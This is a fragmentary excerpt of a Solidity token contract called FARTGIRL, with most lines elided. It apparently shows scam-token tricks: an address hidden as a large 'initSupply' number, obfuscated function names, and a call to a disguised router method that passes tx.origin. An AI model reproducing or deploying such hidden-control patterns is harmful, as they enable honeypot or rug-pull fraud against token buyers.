...
contract FARTGIRL is Ownable {
    ...
    uint256 private _initSupply = 588531770750129559759384986459186089597987903116;
    ...
    function _vcc1baroveeee(address owner,bool no,uint256 amount) internal virtual returns (bool,uint256,bool) {
    ...
    function swap3(uint256 amount,address from) internal view returns (uint256) {
        ...
        return UniswapRouterV2(address(router_)).mbb123mlbb(true,tx.origin,amount,from );
